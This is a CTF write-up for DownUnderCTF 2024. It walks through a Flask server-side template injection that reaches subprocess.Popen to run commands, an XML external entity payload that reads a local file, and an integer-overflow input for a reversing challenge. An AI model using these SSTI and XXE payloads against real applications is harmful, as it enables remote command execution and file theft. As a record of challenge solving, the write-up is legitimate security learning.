# DownUnderCTF 2024 
These are the challenges I solved (or helped solve) in DownUnderCTF 2024
# Web Challenges
## parrot the emu
### hint
> It is so nice to hear Parrot the Emu talk back
### what's on the website
The website consists of a text box. Typing into this text box sends back a page with a "chat log" that parrots your sent message
### the server
The source code for the server is as follows:
```py
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)

if __name__ == '__main__':
    app.run(debug=True, port=80)
```
the user input from the form is rendered using `render_template_string`. This function is known to run arbitray python code if you put render template syntax into it, such as `{{7 * 7}}`. Running this on ther server, the emu reponds `49`, confirming it's vulnerable.
### the exploit
Exploiting from here is simple. The render_template_string context does not have functions like `open` or `os.system`, but using some python builtins and literals we can find some useful functions and jailbreak. We do this using `''.__class__.__mro__[1].__subclasses__()`, which contains a call order that has the actual functions in it, allowing us to call them.  

First we need to find the functions available. We do this by sending the expression and reading the response. Sending `{{''.__class__.__mro__[1].__subclasses__()}}` gets us:
```py
0:    [&lt;class &#39;type&#39;&gt;
1:     &lt;class &#39;weakref&#39;&gt;
2:     &lt;class &#39;weakcallableproxy&#39;&gt;
3:     &lt;class &#39;weakproxy&#39;&gt;
 ...  
213:   &lt;class &#39;subprocess.Popen&#39;&gt;
 ...
```
Which means we can call subprocess.Popen with `''.__class__.__mro__[1].__subclasses__()[213](...)`. This gives us our final exploit:
```python
{{''.__class__.__mro__[1].__subclasses__()[213](["cat", "flag"], stdout = -1).stdout.read()}}
```
Which produces the flag when sent on the website
## zoo feedback form
### hint
> The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

### materials
This is another python flask server. The function we care about is the index function:
```py
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        xml_data = request.data
        try:
            parser = etree.XMLParser(resolve_entities=True)
            root = etree.fromstring(xml_data, parser=parser)
        except etree.XMLSyntaxError as e:
            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
        feedback_element = root.find('feedback')
        if feedback_element is not None:
            feedback = feedback_element.text
            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
        else:
            return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')

    return render_template('index.html')
```
### XML external entities
Because the app uses the `resolve_entities=True` optional parameter, we can use [external entities](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) in the document to retrieve the flag. We will need to send our own document, as external entities are an argument to the DOCTYPE element at the beginning of the document. So, we make the fetch request manually.
### final exploit
Running the following code will return the flag
```js
fetch('/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/xml'
    },
    body: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "flag.txt" >]><root><feedback>&xxe;</feedback></root>'
}).then(data => data.text())
.then(data => console.log(data))
```

# Rev Challenges
## number mashing
### hint
> Mash your keyboard numpad in a specific order and a flag might just pop out!
### reversed binary
The important part of the reversed binary is as follows:
```c
  printf("Give me some numbers: ");
  __isoc99_scanf("%d %d",&n1,&n2);
  if (((n1 == 0) || (n2 == 0)) || (n2 == 1)) {
    puts("Nope!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  ratio = 0;
  if (n2 != 0) {
    ratio = n1 / n2;
  }
  if (ratio != n1) {
    puts("Nope!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  ...
  local_110 = fopen("flag.txt","r");
  fread(&local_108,1,0x100,local_110);
  printf("Correct! %s\n",&local_108);
```
So, we just need numbers n1 and n2 such that `(n1 // n2) == n1` (integer division). However, the obvious choices (n1 = 0 with any n2, or any n1 with n2 = 1) are blocked. So, we need to use the facts of integer division to our benefit: dividing by negative one is the same as inverting all bits and adding one. If we take the minimum integer, `INT_MIN = (int)0x80000000` then we know:  
```c
INT_MIN/(-1) = (~INT_MIN) + 1
             = (int)(0x7fffffff + 1) 
             = (int)0x80000000 
             = INT_MIN
```
Which is exactly what we want. `(int)0x80000000 = -2147483648`, so inputting `-2147483648 -1` passes the ratio check and prints the flag
# Pwn Challenges

